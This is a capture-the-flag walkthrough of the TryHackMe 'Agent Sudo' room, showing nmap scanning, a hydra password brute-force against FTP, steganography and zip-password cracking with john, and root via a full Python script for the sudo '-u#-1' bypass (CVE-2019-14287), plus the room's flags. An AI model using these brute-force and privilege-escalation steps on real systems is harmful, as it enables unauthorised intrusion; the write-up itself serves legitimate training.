---
layout: post
title: "Agent Sudo"
date: 2025-04-16
image: ../../assets/img/Posts/TwoMillion.png
categories: [TryHackMe]
tags: [agent-sudo, agent, sudo, tryhackme]
---

Welcome back to yet another blog post where I will be tackling a [Agent_Sudo](https://tryhackme.com/room/agentsudoctf)

OS:  Ubuntu
Web-Technology:   Apache httpd 2.4.29 ((Ubuntu))
Hostname:  agent_sudo
IP:  10.10.189.142
USER:   james, chris, 
Category: Web / Linux


---
## Enumeration

### Network Enumeration

- Open ports discovered using Nmap:

```sh
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
-----------------------------------------------------------------------------
### Web Enumeration

- Curling the web server with a custom user-agent reveals a note:

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ curl -i http://10.10.205.71
Announcement
Use your User-Agent Code to view #Snip

From
Agent R 
```

This luckily returned a useful information here maybe we should try using curl with other options or burpsuite or something just so we can capture the request and modify the `user-agent` header. Also looking at where the above message is coming from (Agent R), this might mean something maybe we can `iterate` over the alphabets hopefully there are some Characters for the other agents.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ curl -A "C" -L http://10.10.205.71
Attention chris, <br><br>
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
From,<br>
Agent R 
```

In the above `curl` command uses the `-A` switch which allows us to enter the `user-agent` which is `C` in this case and we use `-L` switch to follow `redirects`. Also that can be achieved manually using a `browser` and `burpsuite` as illustrated down below:

![](attachments/Pasted%20image%2020250408095931.png)

After following the `redirects` it send another `GET` request method to use with the `agent_C_attention.php` endpoint which when forwarded show us a different page.


![](attachments/Pasted%20image%2020250408095813.png)

And looking at the response, We notice another message which contains a username of chris (potentially from Agent C --> Agent chris). The message is telling us to inform `Agent J` about some stuff As soon as possible. Further more, The messages indicate we should change our password because it is a weak password. Ohhhyyyyya! You thinking of what I am thinking --> bruteforcing the user `chris` using `hydra`.


![](attachments/Pasted%20image%2020250408095348.png)

Lets now try to `brute-force` the user of chris using hydra to see if we can get any password. To do that we run the below command in our terminal.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP:21
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-08 10:03:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.189.142:21/
[STATUS] 241.00 tries/min, 241 tries in 00:01h, 14344158 to do in 991:60h, 16 active
[21][ftp] host: 10.10.189.142   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-08 10:04:56

```

And there we have it, we are able to `crack` the password (crystal) using hydra. This could be potentially useful to validate `ftp`  and `ssh` services since port 21 and port 22 are all open. We can cross use the username `chris` and password `crystal` across those services. Lets try with port 21 first.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ ftp $IP
Connected to 10.10.189.142.
Name (10.10.189.142:cyberxploit): chris
331 Please specify the password.  #crystal 
Password: 
230 Login successful.
ftp> ls -la
229 Entering Extended Passive Mode (|||54774|)
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Logging into ftp was successful, We then download all of the above files found in the ftp server locally to take a look at what each contain. We are able to achieve that using the ftp command utility `get`  to download [[To_agentJ.txt]] , [[cute-alien.jpg]] and [[cutie.png]].  Only to download all files and notice that the [[To_agentJ.txt]] file is telling us that a password is embedded in one of the `image` file above.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ cat To_agentJ.txt 
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\'t be a problem for you.
From,
Agent C
```

However, we can also take a look at those images since a file embedded in one of them. lets first use the `strings` command utility and if we're lucky we might notice something.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ strings cutie.png
## Redacted ## Strip
IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```

There we have it, at the end of the result, we notice another file called `To_agentR.txt` which is telling us clearly that the picture has an embedded file in it. maybe we can try `binwalk -e` to extract it.

![](attachments/Pasted%20image%2020250408103218.png)

But unfortunately, nothing in the `To_agentR.txt` file, but we can see further in the directory that there is another zipped file (8702.zip) maybe we can unzip that one file which will give us a full extracted version of the To_agentR.txt file. Lets do that in action....
```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo/_cutie.png.extracted]
└──╼ $ ls -la
drwxr-xr-x cyberxploit cyberxploit  64 B  Tue Apr  8 10:30:10 2025  .
drwxr-xr-x cyberxploit cyberxploit 160 B  Tue Apr  8 10:30:02 2025  ..
.rw-r--r-- cyberxploit cyberxploit 273 KB Tue Apr  8 10:30:02 2025  365
.rw-r--r-- cyberxploit cyberxploit  33 KB Tue Apr  8 10:30:02 2025  365.zlib
.rw-r--r-- cyberxploit cyberxploit 280 B  Tue Apr  8 10:30:10 2025  8702.zip
.rw-r--r-- cyberxploit cyberxploit   0 B  Tue Oct 29 13:29:11 2019  To_agentR.txt
```

![](attachments/Pasted%20image%2020250408103655.png)

The zipped file is encrypted with a password and we don't know the exact password used, maybe we should try cracking it using `john the ripper`, just before that we have to convert the zipped file to what john understand and by default john came pre-built with lots of other tools in this case we'll be using `zip2john` to convert the zip file to what john fully understand before attempting to crack the password.


```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo/_cutie.png.extracted]
└──╼ $ zip2john 8702.zip > johny.txt 
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo/_cutie.png.extracted]
└──╼ $ cat johny.txt 
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip
```

and now we are good to go. We can use `john the ripper` to crack the main zipped file passwords. Lets try that in action

```sh
┌─[✗]─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo/_cutie.png.extracted]
└──╼ $ john --format=zip johny.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:08 DONE 2/3 (2025-04-08 10:50) 0.1135g/s 5044p/s 5044c/s 5044C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
There we have the passphrase `alien`. We can use it to unzip the file as illustrated above. We are going to re-run the `7z x 8720.zip` and then paste the `alien` password to extract the file and right there, we now have a real [[To_agentR.txt]] file.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo/_cutie.png.extracted]
└──╼ $ cat To_agentR.txt 
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R

```

This seams to be another agent (C potentially) leaving a message to Agent R also looks like a base64 encoded password lets decode it to see what it contains.

```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ echo "QXJlYTUx" | base64 -d
Area51

```


```sh
┌─[cyberxploit@parrot]─[~/Desktop/projects/ctfs/personal/thm/machines/agent_sudo]
└──╼ $ steghide extract -sf cute-alien.jpg 
Enter passphrase:  #Area51
wrote extracted data to "message.txt".

```


---
# Foothold

After extracting the the [[message.txt]] file from [[cute-alien.jpg]] image file, it seems we now have all information that we need to connect to the machine with the user `james` and the password `hackerrules!` via `ssh`. 

![](attachments/Pasted%20image%2020250409152704.png)

```sh
ssh james@$IP
```

---
# Pivoting


```sh
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -u chris /bin/bash
chris@agent-sudo:~$ id
uid=1001(chris) gid=1001(chris) groups=1001(chris)

```

-----------------------------------------------------------------------------
# Privilege-Escalation



![](attachments/Pasted%20image%2020250409141345.png)

![](attachments/Pasted%20image%2020250409142104.png)

### Exploit Used

- Sudo version 1.8.21p2 (exploitDB) the link is in the #reference section below

```python
#!/usr/bin/python3

import os

#Get current username
username = input("Enter current username :")
#check which binary the user can run with sudo
os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read()
#execute sudo exploit
print("Lets hope it works")
os.system("sudo -u#-1 "+ binary)            
```

Upon creating the `exploit.py` file on the target system, We gave it an execute permission so that we can run the script and if we are lucky, we'll be root in no seconds. Easssssyyyy right? Ptsssss!! `chmod +x exploit.py` 

```sh
james@agent-sudo:~$ python3 exploit.py 
Enter current username :james
[sudo] password for james: 
Lets hope it works
root@agent-sudo:~# whoami;id
root
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# 


```
-----------------------------------------------------------------------------
# Flags Obtained

| user flag                          | root flag                          |
| ---------------------------------- | ---------------------------------- |
| `b03d975e8c92a7c04146cfa7a5a313c7` | `b53a02f55b57d4439e3341834d70c062` |

-----------------------------------------------------------------------------
# Take away Concept

```
=========================================================================
* Alway pay attention to little information, They might be something you can never imagine (Agent Sudo)
* Looking at the `sudo -l` command, james can run sudo as every user except root (!root), sudo -u chris /bin/bash can be something is some scenerio
* Try all possible hint given by the authors, think extra!!

=========================================================================
```

-----------------------------------------------------------------------------

# 🔗 References

- [sudo 1.8.27 - Security Bypass - Linux local Exploit](https://www.exploit-db.com/exploits/47502)]  
- [Roswell Alien Autopsy](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment)
---

 
